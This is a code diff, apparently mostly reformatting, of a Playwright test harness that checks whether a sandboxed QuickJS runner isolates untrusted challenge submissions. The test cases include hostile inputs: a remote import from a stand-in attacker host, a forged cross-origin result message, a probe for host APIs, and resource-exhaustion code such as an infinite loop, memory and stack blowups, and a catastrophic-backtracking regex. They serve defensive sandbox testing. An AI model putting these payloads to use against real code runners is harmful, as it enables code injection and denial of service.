@@ -1,4 +1,3 @@
-import assert from 'node:assert/strict';
 import { createServer } from 'node:http';
 import { createRequire } from 'node:module';
 import { readFile, stat } from 'node:fs/promises';
@@ -14,7 +13,8 @@ const fixtureCasesPath = resolve(ROOT, 'challenges/longest-window/cases.ts');
 const solutionPath = resolve(ROOT, 'challenges/longest-window/solution.ts');
 const packageJson = JSON.parse(await readFile(resolve(SPIKE, 'package.json'), 'utf8'));
 const playwrightModule = process.env.LAB_RUNNER_PLAYWRIGHT_MODULE;
-if (!playwrightModule) throw new Error('Set LAB_RUNNER_PLAYWRIGHT_MODULE to the preinstalled @playwright/test package path.');
+if (!playwrightModule)
+  throw new Error('Set LAB_RUNNER_PLAYWRIGHT_MODULE to the preinstalled @playwright/test package path.');
 const { chromium } = require(playwrightModule);
 const TypeScript = require(process.env.LAB_RUNNER_TYPESCRIPT_MODULE ?? 'typescript');
 
@@ -77,11 +77,17 @@ async function buildFixture() {
 
 function mime(path) {
   switch (extname(path)) {
-    case '.html': return 'text/html; charset=utf-8';
-    case '.js': case '.mjs': return 'text/javascript; charset=utf-8';
-    case '.wasm': return 'application/wasm';
-    case '.css': return 'text/css; charset=utf-8';
-    default: return 'application/octet-stream';
+    case '.html':
+      return 'text/html; charset=utf-8';
+    case '.js':
+    case '.mjs':
+      return 'text/javascript; charset=utf-8';
+    case '.wasm':
+      return 'application/wasm';
+    case '.css':
+      return 'text/css; charset=utf-8';
+    default:
+      return 'application/octet-stream';
   }
 }
 
@@ -353,10 +359,16 @@ window.__makeFrame=(sandbox)=>{
   const runnerServer = createServer(async (request, response) => {
     const url = new URL(request.url, `http://${request.headers.host}`);
     if (url.pathname === '/fixture-config.js') {
-      respond(response, 200, `window.__RUNNER_APP_ORIGIN__=${JSON.stringify(state.appOrigin)};`, 'text/javascript; charset=utf-8', {
-        'Access-Control-Allow-Origin': '*',
-        'Content-Security-Policy': state.runnerPageCsp,
-      });
+      respond(
+        response,
+        200,
+        `window.__RUNNER_APP_ORIGIN__=${JSON.stringify(state.appOrigin)};`,
+        'text/javascript; charset=utf-8',
+        {
+          'Access-Control-Allow-Origin': '*',
+          'Content-Security-Policy': state.runnerPageCsp,
+        },
+      );
       return;
     }
     const relative = url.pathname === '/' ? '/index.html' : decodeURIComponent(url.pathname);
@@ -392,28 +404,57 @@ window.__makeFrame=(sandbox)=>{
 }
 
 async function waitForMessage(page, { kind, nonce = null, afterIndex = 0 }, timeout = 8000) {
-  await page.waitForFunction(({ expectedKind, expectedNonce, beforeIndex }) => window.__messages.slice(beforeIndex).some((entry) =>
-    entry.data?.kind === expectedKind && (expectedNonce === null || entry.data?.nonce === expectedNonce)),
-  { expectedKind: kind, expectedNonce: nonce, beforeIndex: afterIndex }, { timeout });
-  return page.evaluate(({ expectedKind, expectedNonce, beforeIndex }) => window.__messages.slice(beforeIndex).find((entry) =>
-    entry.data?.kind === expectedKind && (expectedNonce === null || entry.data?.nonce === expectedNonce)),
-  { expectedKind: kind, expectedNonce: nonce, beforeIndex: afterIndex });
+  await page.waitForFunction(
+    ({ expectedKind, expectedNonce, beforeIndex }) =>
+      window.__messages
+        .slice(beforeIndex)
+        .some(
+          (entry) =>
+            entry.data?.kind === expectedKind && (expectedNonce === null || entry.data?.nonce === expectedNonce),
+        ),
+    { expectedKind: kind, expectedNonce: nonce, beforeIndex: afterIndex },
+    { timeout },
+  );
+  return page.evaluate(
+    ({ expectedKind, expectedNonce, beforeIndex }) =>
+      window.__messages
+        .slice(beforeIndex)
+        .find(
+          (entry) =>
+            entry.data?.kind === expectedKind && (expectedNonce === null || entry.data?.nonce === expectedNonce),
+        ),
+    { expectedKind: kind, expectedNonce: nonce, beforeIndex: afterIndex },
+  );
 }
 
 async function inspectFrame(page, nonce, timeout = 2500) {
-  return page.evaluate(({ inspectionNonce, timeoutMs }) => new Promise((resolveInspection) => {
-    const timer = setTimeout(() => resolveInspection(null), timeoutMs);
-    const listener = (event) => {
-      if (event.source !== window.__activeFrame.contentWindow
-        || event.data?.kind !== 'fixture-inspection'
-        || event.data?.nonce !== inspectionNonce) return;
-      clearTimeout(timer);
-      window.removeEventListener('message', listener);
-      resolveInspection({ origin: event.origin, sourceMatches: event.source === window.__activeFrame.contentWindow, evidence: event.data.evidence });
-    };
-    window.addEventListener('message', listener);
-    window.__activeFrame.contentWindow.postMessage({ kind: 'fixture-inspect', nonce: inspectionNonce }, window.__runnerOrigin);
-  }), { inspectionNonce: nonce, timeoutMs: timeout });
+  return page.evaluate(
+    ({ inspectionNonce, timeoutMs }) =>
+      new Promise((resolveInspection) => {
+        const timer = setTimeout(() => resolveInspection(null), timeoutMs);
+        const listener = (event) => {
+          if (
+            event.source !== window.__activeFrame.contentWindow ||
+            event.data?.kind !== 'fixture-inspection' ||
+            event.data?.nonce !== inspectionNonce
+          )
+            return;
+          clearTimeout(timer);
+          window.removeEventListener('message', listener);
+          resolveInspection({
+            origin: event.origin,
+            sourceMatches: event.source === window.__activeFrame.contentWindow,
+            evidence: event.data.evidence,
+          });
+        };
+        window.addEventListener('message', listener);
+        window.__activeFrame.contentWindow.postMessage(
+          { kind: 'fixture-inspect', nonce: inspectionNonce },
+          window.__runnerOrigin,
+        );
+      }),
+    { inspectionNonce: nonce, timeoutMs: timeout },
+  );
 }
 
 async function requestRun(page, request, timeout = 8000) {
@@ -434,11 +475,25 @@ async function requestRun(page, request, timeout = 8000) {
       cases: message.cases.map(({ id, expected }) => ({ caseId: id, expected })),
     };
   }, request);
-  await page.evaluate((message) => window.__activeFrame.contentWindow.postMessage(message, window.__runnerOrigin), request);
-  await page.waitForFunction(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).some((entry) =>
-    entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: before, nonce: request.nonce }, { timeout });
-  const response = await page.evaluate(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).find((entry) =>
-    entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: before, nonce: request.nonce });
+  await page.evaluate(
+    (message) => window.__activeFrame.contentWindow.postMessage(message, window.__runnerOrigin),
+    request,
+  );
+  await page.waitForFunction(
+    ({ beforeIndex, nonce }) =>
+      window.__messages
+        .slice(beforeIndex)
+        .some((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+    { beforeIndex: before, nonce: request.nonce },
+    { timeout },
+  );
+  const response = await page.evaluate(
+    ({ beforeIndex, nonce }) =>
+      window.__messages
+        .slice(beforeIndex)
+        .find((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+    { beforeIndex: before, nonce: request.nonce },
+  );
   return response;
 }
 
@@ -447,7 +502,10 @@ async function requestHardDeadlineProbe(page, request, timeout = 7000) {
   await page.evaluate((message) => {
     if (typeof window.__registerPendingRun === 'function') {
       window.__registerPendingRun(message);
-      window.__activeFrame.contentWindow.postMessage({ kind: 'test-hard-deadline', request: message }, window.__runnerOrigin);
+      window.__activeFrame.contentWindow.postMessage(
+        { kind: 'test-hard-deadline', request: message },
+        window.__runnerOrigin,
+      );
       return;
     }
     window.__pendingRuns[message.nonce] = {
@@ -460,12 +518,26 @@ async function requestHardDeadlineProbe(page, request, timeout = 7000) {
       sourceRevision: message.sourceRevision,
       cases: message.cases.map(({ id, expected }) => ({ caseId: id, expected })),
     };
-    window.__activeFrame.contentWindow.postMessage({ kind: 'test-hard-deadline', request: message }, window.__runnerOrigin);
+    window.__activeFrame.contentWindow.postMessage(
+      { kind: 'test-hard-deadline', request: message },
+      window.__runnerOrigin,
+    );
   }, request);
-  await page.waitForFunction(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).some((entry) =>
-    entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: before, nonce: request.nonce }, { timeout });
-  const response = await page.evaluate(({ beforeIndex, nonce }) => window.__messages.slice(beforeIndex).find((entry) =>
-    entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { beforeIndex: before, nonce: request.nonce });
+  await page.waitForFunction(
+    ({ beforeIndex, nonce }) =>
+      window.__messages
+        .slice(beforeIndex)
+        .some((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+    { beforeIndex: before, nonce: request.nonce },
+    { timeout },
+  );
+  const response = await page.evaluate(
+    ({ beforeIndex, nonce }) =>
+      window.__messages
+        .slice(beforeIndex)
+        .find((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+    { beforeIndex: before, nonce: request.nonce },
+  );
   return response;
 }
 
@@ -513,54 +585,79 @@ function activeResultEnvelope(nonce) {
 
 async function injectActiveResult(page, envelope, { register = true, pending = null, sparseArray = null } = {}) {
   const beforeIndex = await page.evaluate(() => window.__messages.length);
-  await page.evaluate(({ message, shouldRegister, pendingRun, sparseArray: sparseArrayKind }) => {
-    if (shouldRegister) window.__pendingRuns[message.nonce] = pendingRun;
-    if (sparseArrayKind === 'cases') {
-      const cases = new Array(message.result.cases.length);
-      cases[0] = message.result.cases[0];
-      message.result.cases = cases;
-    } else if (sparseArrayKind === 'diagnostics') {
-      message.result.diagnostics = new Array(1);
-    } else if (sparseArrayKind === 'nested-actual') {
-      const actual = new Array(3);
-      actual[0] = 1;
-      actual[2] = 3;
-      message.result.cases[0].actual = actual;
-    }
-    window.__activeFrame.contentWindow.postMessage({
-      kind: 'test-parent-message',
-      message,
-    }, window.__runnerOrigin);
-  }, { message: envelope, shouldRegister: register, pendingRun: pending ?? activePending(envelope.nonce), sparseArray });
-  await page.waitForFunction(({ index, nonce }) => window.__messages.slice(index).some((entry) =>
-    entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
-  { index: beforeIndex, nonce: envelope.nonce }, { timeout: 2000 });
-  return page.evaluate(({ index, nonce, sparseArray: sparseArrayKind }) => {
-    const entry = window.__messages.slice(index).find((item) =>
-      item.data?.kind === 'run-result' && item.data?.nonce === nonce);
-    const result = entry?.data?.result;
-    const sparseValue = sparseArrayKind === 'cases' ? result?.cases
-      : sparseArrayKind === 'diagnostics' ? result?.diagnostics
-        : sparseArrayKind === 'nested-actual' ? result?.cases?.[0]?.actual : null;
-    const sparseHoleIndex = sparseArrayKind === 'diagnostics' ? 0 : sparseArrayKind ? 1 : -1;
-    return {
-      accepted: !!entry && window.__acceptedResults.includes(entry),
-      infrastructureError: window.__runFailures?.some((item) => item.nonce === nonce
-        && item.status === 'infrastructure-error') ?? false,
-      pendingRetired: !Object.hasOwn(window.__pendingRuns, nonce),
-      received: !!entry,
-      sparseHolePreserved: sparseHoleIndex >= 0 && Array.isArray(sparseValue)
-        && !Object.hasOwn(sparseValue, sparseHoleIndex),
-    };
-  }, { index: beforeIndex, nonce: envelope.nonce, sparseArray });
+  await page.evaluate(
+    ({ message, shouldRegister, pendingRun, sparseArray: sparseArrayKind }) => {
+      if (shouldRegister) window.__pendingRuns[message.nonce] = pendingRun;
+      if (sparseArrayKind === 'cases') {
+        const cases = new Array(message.result.cases.length);
+        cases[0] = message.result.cases[0];
+        message.result.cases = cases;
+      } else if (sparseArrayKind === 'diagnostics') {
+        message.result.diagnostics = new Array(1);
+      } else if (sparseArrayKind === 'nested-actual') {
+        const actual = new Array(3);
+        actual[0] = 1;
+        actual[2] = 3;
+        message.result.cases[0].actual = actual;
+      }
+      window.__activeFrame.contentWindow.postMessage(
+        {
+          kind: 'test-parent-message',
+          message,
+        },
+        window.__runnerOrigin,
+      );
+    },
+    { message: envelope, shouldRegister: register, pendingRun: pending ?? activePending(envelope.nonce), sparseArray },
+  );
+  await page.waitForFunction(
+    ({ index, nonce }) =>
+      window.__messages.slice(index).some((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+    { index: beforeIndex, nonce: envelope.nonce },
+    { timeout: 2000 },
+  );
+  return page.evaluate(
+    ({ index, nonce, sparseArray: sparseArrayKind }) => {
+      const entry = window.__messages
+        .slice(index)
+        .find((item) => item.data?.kind === 'run-result' && item.data?.nonce === nonce);
+      const result = entry?.data?.result;
+      const sparseValue =
+        sparseArrayKind === 'cases'
+          ? result?.cases
+          : sparseArrayKind === 'diagnostics'
+            ? result?.diagnostics
+            : sparseArrayKind === 'nested-actual'
+              ? result?.cases?.[0]?.actual
+              : null;
+      const sparseHoleIndex = sparseArrayKind === 'diagnostics' ? 0 : sparseArrayKind ? 1 : -1;
+      return {
+        accepted: !!entry && window.__acceptedResults.includes(entry),
+        infrastructureError:
+          window.__runFailures?.some((item) => item.nonce === nonce && item.status === 'infrastructure-error') ?? false,
+        pendingRetired: !Object.hasOwn(window.__pendingRuns, nonce),
+        received: !!entry,
+        sparseHolePreserved:
+          sparseHoleIndex >= 0 && Array.isArray(sparseValue) && !Object.hasOwn(sparseValue, sparseHoleIndex),
+      };
+    },
+    { index: beforeIndex, nonce: envelope.nonce, sparseArray },
+  );
 }
 
 async function sendRunnerMessage(page, message) {
   const beforeIndex = await page.evaluate(() => window.__messages.length);
-  await page.evaluate((data) => window.__activeFrame.contentWindow.postMessage({
-    kind: 'test-parent-message',
-    message: data,
-  }, window.__runnerOrigin), message);
+  await page.evaluate(
+    (data) =>
+      window.__activeFrame.contentWindow.postMessage(
+        {
+          kind: 'test-parent-message',
+          message: data,
+        },
+        window.__runnerOrigin,
+      ),
+    message,
+  );
   await page.waitForFunction((index) => window.__messages.length > index, beforeIndex, { timeout: 2000 });
 }
 
@@ -587,14 +684,17 @@ async function createFrame(page, sandbox, status) {
     ready = await responseWaiter;
   } catch (error) {
     const frames = page.frames().map((frame) => ({ name: frame.name(), url: frame.url() }));
-    throw new Error(`${error.message}; frame bootstrap diagnostics: ${JSON.stringify({
-      sandbox,
-      frames,
-      consoleErrors: status.consoleErrors,
-      pageErrors: status.pageErrors,
-      failedRequests: status.failedRequests,
-      runnerResponses: status.runnerResponses,
-    })}`);
+    throw new Error(
+      `${error.message}; frame bootstrap diagnostics: ${JSON.stringify({
+        sandbox,
+        frames,
+        consoleErrors: status.consoleErrors,
+        pageErrors: status.pageErrors,
+        failedRequests: status.failedRequests,
+        runnerResponses: status.runnerResponses,
+      })}`,
+      { cause: error },
+    );
   }
   status.readyMessage = ready;
   status.readyOrigin = ready.origin;
@@ -649,16 +749,24 @@ export async function runQuickJsFeasibility() {
     const failedRequests = [];
     const runnerResponses = [];
     state.browserDiagnostics = { consoleErrors, pageErrors, failedRequests, runnerResponses };
-    page.on('console', (message) => { if (message.type() === 'error') consoleErrors.push(message.text()); });
+    page.on('console', (message) => {
+      if (message.type() === 'error') consoleErrors.push(message.text());
+    });
     page.on('pageerror', (error) => pageErrors.push(error.message));
-    page.on('requestfailed', (request) => failedRequests.push({
-      url: request.url(),
-      resourceType: request.resourceType(),
-      error: request.failure()?.errorText ?? 'unknown',
-    }));
+    page.on('requestfailed', (request) =>
+      failedRequests.push({
+        url: request.url(),
+        resourceType: request.resourceType(),
+        error: request.failure()?.errorText ?? 'unknown',
+      }),
+    );
     page.on('response', (response) => {
       if (response.url().startsWith(state.runnerOrigin ?? 'http://runner.test')) {
-        runnerResponses.push({ url: response.url(), status: response.status(), type: response.request().resourceType() });
+        runnerResponses.push({
+          url: response.url(),
+          status: response.status(),
+          type: response.request().resourceType(),
+        });
       }
     });
     const appResponse = await page.goto(`${state.appOrigin}/`, { waitUntil: 'load' });
@@ -670,33 +778,51 @@ export async function runQuickJsFeasibility() {
     const opaqueWorkerProbeBefore = await page.evaluate(() => window.__messages.length);
     await createFrame(page, 'allow-scripts', opaqueEnv);
     const opaqueReady = opaqueEnv.readyMessage;
-    await page.waitForFunction((beforeIndex) => window.__messages.slice(beforeIndex).some((entry) =>
-      entry.data?.kind === 'opaque-worker-probe-result'), opaqueWorkerProbeBefore, { timeout: 6500 });
-    const opaqueWorkerProbe = await page.evaluate((beforeIndex) => window.__messages.slice(beforeIndex).find((entry) =>
-      entry.data?.kind === 'opaque-worker-probe-result'), opaqueWorkerProbeBefore);
-    const opaqueTargetProbe = await page.evaluate(() => new Promise((resolveProbe) => {
-      const nonce = 'opaque-target-origin-probe';
-      const timer = setTimeout(() => resolveProbe(false), 300);
-      const listener = (event) => {
-        if (event.source !== window.__activeFrame.contentWindow
-          || event.data?.kind !== 'fixture-target-probe-result'
-          || event.data?.nonce !== nonce) return;
-        clearTimeout(timer);
-        window.removeEventListener('message', listener);
-        resolveProbe(true);
-      };
-      window.addEventListener('message', listener);
-      window.__activeFrame.contentWindow.postMessage({ kind: 'fixture-opaque-target-probe', nonce }, window.__runnerOrigin);
-    }));
+    await page.waitForFunction(
+      (beforeIndex) =>
+        window.__messages.slice(beforeIndex).some((entry) => entry.data?.kind === 'opaque-worker-probe-result'),
+      opaqueWorkerProbeBefore,
+      { timeout: 6500 },
+    );
+    const opaqueWorkerProbe = await page.evaluate(
+      (beforeIndex) =>
+        window.__messages.slice(beforeIndex).find((entry) => entry.data?.kind === 'opaque-worker-probe-result'),
+      opaqueWorkerProbeBefore,
+    );
+    const opaqueTargetProbe = await page.evaluate(
+      () =>
+        new Promise((resolveProbe) => {
+          const nonce = 'opaque-target-origin-probe';
+          const timer = setTimeout(() => resolveProbe(false), 300);
+          const listener = (event) => {
+            if (
+              event.source !== window.__activeFrame.contentWindow ||
+              event.data?.kind !== 'fixture-target-probe-result' ||
+              event.data?.nonce !== nonce
+            )
+              return;
+            clearTimeout(timer);
+            window.removeEventListener('message', listener);
+            resolveProbe(true);
+          };
+          window.addEventListener('message', listener);
+          window.__activeFrame.contentWindow.postMessage(
+            { kind: 'fixture-opaque-target-probe', nonce },
+            window.__runnerOrigin,
+          );
+        }),
+    );
     await page.evaluate(() => window.__activeFrame.remove());
 
     const q5 = {
       deployedProofBlocked: true,
-      deployedProofReason: 'No deployed runner site, TLS endpoint, production cookie configuration, or response headers were provisioned for this local-only spike.',
+      deployedProofReason:
+        'No deployed runner site, TLS endpoint, production cookie configuration, or response headers were provisioned for this local-only spike.',
       opaqueFrameOriginNull: opaqueReady?.origin === 'null',
       opaqueReadySourceMatches: opaqueReady?.sourceMatches === true,
       opaqueExactTargetMessageDelivered: opaqueTargetProbe,
-      opaqueStorageParentAndCookieChecks: 'not-measured: the approved exact-target parent protocol cannot inspect an opaque origin',
+      opaqueStorageParentAndCookieChecks:
+        'not-measured: the approved exact-target parent protocol cannot inspect an opaque origin',
       opaqueWorkerBootstrapOutcome: opaqueWorkerProbe?.data?.outcome ?? 'missing-result',
       opaqueWorkerStatus: opaqueWorkerProbe?.data?.status ?? null,
       opaqueWorkerQuickJsVersion: opaqueWorkerProbe?.data?.quickjsVersion ?? null,
@@ -711,11 +837,12 @@ export async function runQuickJsFeasibility() {
     const response = await requestRun(page, runMessage(challenge.source, challengeInputs, 'canonical', 7));
     const workerEvidence = response.data.testEvidence;
     const caseResults = response.data.result.cases;
-    const canonicalPassed = response.origin === state.runnerOrigin
-      && response.sourceMatches
-      && response.data.result.status === 'passed'
-      && caseResults.length === challenge.cases.length
-      && caseResults.every((item, index) => item.status === 'passed' && item.caseId === challenge.cases[index].id);
+    const canonicalPassed =
+      response.origin === state.runnerOrigin &&
+      response.sourceMatches &&
+      response.data.result.status === 'passed' &&
+      caseResults.length === challenge.cases.length &&
+      caseResults.every((item, index) => item.status === 'passed' && item.caseId === challenge.cases[index].id);
 
     const wrongSourceNonce = 'wrong-source-valid-origin';
     const peerPromise = context.waitForEvent('page');
@@ -723,12 +850,32 @@ export async function runQuickJsFeasibility() {
     const peerPage = await peerPromise;
     await peerPage.waitForLoadState('load');
     const wrongSourceBefore = await page.evaluate(() => window.__messages.length);
-    await peerPage.evaluate(({ nonce, source, cases }) => window.opener.__activeFrame.contentWindow.postMessage({
-      protocol: 1, kind: 'run', nonce, runId: nonce, challengeId: 'longest-window', challengeVersion: '1.0.0', sourceRevision: 1, source, cases,
-    }, window.opener.__runnerOrigin), { nonce: wrongSourceNonce, source: challenge.source, cases: challengeInputs.slice(0, 1) });
+    await peerPage.evaluate(
+      ({ nonce, source, cases }) =>
+        window.opener.__activeFrame.contentWindow.postMessage(
+          {
+            protocol: 1,
+            kind: 'run',
+            nonce,
+            runId: nonce,
+            challengeId: 'longest-window',
+            challengeVersion: '1.0.0',
+            sourceRevision: 1,
+            source,
+            cases,
+          },
+          window.opener.__runnerOrigin,
+        ),
+      { nonce: wrongSourceNonce, source: challenge.source, cases: challengeInputs.slice(0, 1) },
+    );
     await delay(200);
-    const wrongSourceRejected = await page.evaluate(({ nonce, beforeIndex }) => !window.__messages.slice(beforeIndex).some((entry) =>
-      entry.data?.kind === 'run-result' && entry.data?.nonce === nonce), { nonce: wrongSourceNonce, beforeIndex: wrongSourceBefore });
+    const wrongSourceRejected = await page.evaluate(
+      ({ nonce, beforeIndex }) =>
+        !window.__messages
+          .slice(beforeIndex)
+          .some((entry) => entry.data?.kind === 'run-result' && entry.data?.nonce === nonce),
+      { nonce: wrongSourceNonce, beforeIndex: wrongSourceBefore },
+    );
     await peerPage.close();
 
     const foreignPagePromise = context.waitForEvent('page');
@@ -737,85 +884,229 @@ export async function runQuickJsFeasibility() {
     await foreignPage.waitForLoadState('load');
     const foreignBefore = await page.evaluate(() => window.__messages.length);
     await foreignPage.evaluate(() => window.__sendForeignResult());
-    await page.waitForFunction(({ beforeIndex }) => window.__messages.length > beforeIndex, { beforeIndex: foreignBefore }, { timeout: 2000 });
-    const foreignMessage = await page.evaluate((beforeIndex) => window.__messages.slice(beforeIndex).find((entry) =>
-      entry.data?.nonce === 'foreign-forged-pass'), foreignBefore);
-    const foreignOriginRejected = foreignMessage?.origin === state.attackerOrigin
-      && foreignMessage.sourceMatches === false
-      && !(await page.evaluate(() => window.__acceptedResults.some((entry) => entry.data?.nonce === 'foreign-forged-pass')));
+    await page.waitForFunction(
+      ({ beforeIndex }) => window.__messages.length > beforeIndex,
+      { beforeIndex: foreignBefore },
+      { timeout: 2000 },
+    );
+    const foreignMessage = await page.evaluate(
+      (beforeIndex) =>
+        window.__messages.slice(beforeIndex).find((entry) => entry.data?.nonce === 'foreign-forged-pass'),
+      foreignBefore,
+    );
+    const foreignOriginRejected =
+      foreignMessage?.origin === state.attackerOrigin &&
+      foreignMessage.sourceMatches === false &&
+      !(await page.evaluate(() =>
+        window.__acceptedResults.some((entry) => entry.data?.nonce === 'foreign-forged-pass'),
+      ));
     await foreignPage.close();
 
-    const typeMismatchResponse = await requestRun(page, runMessage(
-      'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { const bad: number = "nope"; return { start: bad, endExclusive: bad }; }',
-      challengeInputs.slice(0, 1), 'type-mismatch', 8));
-    const syntaxErrorResponse = await requestRun(page, runMessage('export function longestWindow( {', challengeInputs.slice(0, 1), 'syntax-error', 9));
-    const importResponse = await requestRun(page, runMessage('import { something } from "https://attacker.test/payload.js"; export function longestWindow(events: string[], k: number) { return { start: 0, endExclusive: 0 }; }', challengeInputs.slice(0, 1), 'import', 10));
+    const typeMismatchResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { const bad: number = "nope"; return { start: bad, endExclusive: bad }; }',
+        challengeInputs.slice(0, 1),
+        'type-mismatch',
+        8,
+      ),
+    );
+    const syntaxErrorResponse = await requestRun(
+      page,
+      runMessage('export function longestWindow( {', challengeInputs.slice(0, 1), 'syntax-error', 9),
+    );
+    const importResponse = await requestRun(
+      page,
+      runMessage(
+        'import { something } from "https://attacker.test/payload.js"; export function longestWindow(events: string[], k: number) { return { start: 0, endExclusive: 0 }; }',
+        challengeInputs.slice(0, 1),
+        'import',
+        10,
+      ),
+    );
     const malformedRequest = runMessage(challenge.source, challengeInputs.slice(0, 1), 'malformed', 11);
     malformedRequest.nonce = 'short';
     const malformedResponse = await requestRun(page, malformedRequest);
-    const runtimeErrorResponse = await requestRun(page, runMessage('export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { throw new Error("fixture runtime error"); }', challengeInputs.slice(0, 1), 'runtime-error', 11));
-    const hostApiResponse = await requestRun(page, runMessage(
-      'export function longestWindow(events: string[], k: number) { return { start: 0, endExclusive: typeof fetch === "undefined" && typeof window === "undefined" && typeof document === "undefined" && typeof localStorage === "undefined" && typeof indexedDB === "undefined" && typeof parent === "undefined" && typeof location === "undefined" && typeof WebSocket === "undefined" && typeof XMLHttpRequest === "undefined" && typeof Worker === "undefined" && typeof process === "undefined" && typeof require === "undefined" && typeof postMessage === "undefined" && typeof self === "undefined" ? 0 : 1 }; }',
-      challengeInputs.slice(0, 1), 'host-api', 12));
-    const stateSource = 'let counter = 0; export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { counter += 1; return { start: counter, endExclusive: counter }; }';
-    const stateResponse = await requestRun(page, runMessage(stateSource, [
-      { id: 'state-one', input: { events: [], k: 1 }, expected: { start: 1, endExclusive: 1 } },
-      { id: 'state-two', input: { events: [], k: 1 }, expected: { start: 1, endExclusive: 1 } },
-    ], 'state-reset', 13));
+    const runtimeErrorResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { throw new Error("fixture runtime error"); }',
+        challengeInputs.slice(0, 1),
+        'runtime-error',
+        11,
+      ),
+    );
+    const hostApiResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number) { return { start: 0, endExclusive: typeof fetch === "undefined" && typeof window === "undefined" && typeof document === "undefined" && typeof localStorage === "undefined" && typeof indexedDB === "undefined" && typeof parent === "undefined" && typeof location === "undefined" && typeof WebSocket === "undefined" && typeof XMLHttpRequest === "undefined" && typeof Worker === "undefined" && typeof process === "undefined" && typeof require === "undefined" && typeof postMessage === "undefined" && typeof self === "undefined" ? 0 : 1 }; }',
+        challengeInputs.slice(0, 1),
+        'host-api',
+        12,
+      ),
+    );
+    const stateSource =
+      'let counter = 0; export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { counter += 1; return { start: counter, endExclusive: counter }; }';
+    const stateResponse = await requestRun(
+      page,
+      runMessage(
+        stateSource,
+        [
+          { id: 'state-one', input: { events: [], k: 1 }, expected: { start: 1, endExclusive: 1 } },
+          { id: 'state-two', input: { events: [], k: 1 }, expected: { start: 1, endExclusive: 1 } },
+        ],
+        'state-reset',
+        13,
+      ),
+    );
 
-    const sourceLimitResponse = await requestRun(page, runMessage('x'.repeat(33 * 1024), challengeInputs.slice(0, 1), 'source-limit', 14));
-    const inputLimitResponse = await requestRun(page, runMessage(challenge.source, [
-      { id: 'large-input', input: { events: ['x'.repeat(1024 * 1024 + 32)], k: 1 }, expected: { start: 0, endExclusive: 0 } },
-    ], 'input-limit', 15));
-    const caseLimitResponse = await requestRun(page, runMessage(challenge.source,
-      Array.from({ length: 101 }, (_, index) => ({ id: `case-${index}`, input: { events: [], k: 1 }, expected: { start: 0, endExclusive: 0 } })),
-      'case-limit', 16));
+    const sourceLimitResponse = await requestRun(
+      page,
+      runMessage('x'.repeat(33 * 1024), challengeInputs.slice(0, 1), 'source-limit', 14),
+    );
+    const inputLimitResponse = await requestRun(
+      page,
+      runMessage(
+        challenge.source,
+        [
+          {
+            id: 'large-input',
+            input: { events: ['x'.repeat(1024 * 1024 + 32)], k: 1 },
+            expected: { start: 0, endExclusive: 0 },
+          },
+        ],
+        'input-limit',
+        15,
+      ),
+    );
+    const caseLimitResponse = await requestRun(
+      page,
+      runMessage(
+        challenge.source,
+        Array.from({ length: 101 }, (_, index) => ({
+          id: `case-${index}`,
+          input: { events: [], k: 1 },
+          expected: { start: 0, endExclusive: 0 },
+        })),
+        'case-limit',
+        16,
+      ),
+    );
 
     await page.evaluate(() => {
       window.__responsiveTicks = 0;
       window.__loopStartedAt = performance.now();
-      window.__responsivenessTimer = setInterval(() => { window.__responsiveTicks += 1; }, 25);
+      window.__responsivenessTimer = setInterval(() => {
+        window.__responsiveTicks += 1;
+      }, 25);
     });
-    const loopResponse = await requestRun(page, runMessage(
-      'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { while (true) {} return { start: 0, endExclusive: 0 }; }',
-      challengeInputs.slice(0, 1), 'loop', 16), 7000);
+    const loopResponse = await requestRun(
+      page,
+      runMessage(
+        'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { while (true) {} return { start: 0, endExclusive: 0 }; }',
+        challengeInputs.slice(0, 1),
+        'loop',
+        16,
+      ),
+      7000,
+    );
     const loopTiming = await page.evaluate(() => {
       clearInterval(window.__responsivenessTimer);
-      return { responsiveTicks: window.__responsiveTicks, durationMs: Math.round(performance.now() - window.__loopStartedAt) };
+      return {
+        responsiveTicks: window.__responsiveTicks,
+        durationMs: Math.round(performance.now() - window.__loopStartedAt),
+      };
     });
-    const memoryResponse = await requestRun(page, runMessage(
-      'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { const large = new Array(100000000).fill(1); return { start: large.length, endExclusive: large.length }; }',
-      challengeInputs.slice(0, 1), 'memory', 17), 7000);
-    const stackResponse = await requestRun(page, runMessage(
-      'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { function recurse(): number { return 1 + recurse(); } const value = recurse(); return { start: value, endExclusive: value }; }',
-      challengeInputs.slice(0, 1), 'stack', 18), 7000);
-    const outputResponse = await requestRun(page, runMessage(
-      'export function longestWindow(events: string[], k: number) { const huge = "x".repeat(100000); return { start: huge, endExclusive: huge }; }',
-      challengeInputs.slice(0, 1), 'output', 19), 7000);
-    const expensiveSource = 'export function longestWindow(events: string[], k: number): { start: number; endExclusive: number } { const text = "a".repeat(50000) + "!"; const matched = /(a+)+$/.test(text); return { start: matched ? 1 : 0, endExclusive: 0 }; }';
-    const expensiveResponse = await requestRun(page, runMessage(
-      expensiveSource, challengeInputs.slice(0, 1), 'expensive-regexp-interrupt', 20), 7000);
